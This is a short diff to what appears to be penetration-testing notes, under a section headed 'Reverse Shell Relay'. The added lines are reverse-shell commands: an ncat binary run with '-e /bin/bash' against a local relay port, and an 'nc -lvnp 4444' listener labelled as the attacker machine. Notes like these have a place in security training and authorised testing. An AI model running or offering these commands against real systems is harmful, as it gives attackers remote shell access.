@@ -639,4 +639,14 @@ Reverse Shell Relay
 socat linux binary  machine port       attacker IP and port
 ```
 
+```
+./ncat_sardarji 127.0.0.1 8000 -e /bin/bash
+```
+
+Attacker machine
+```
+nc -lvnp 4444
+```
+
+
 
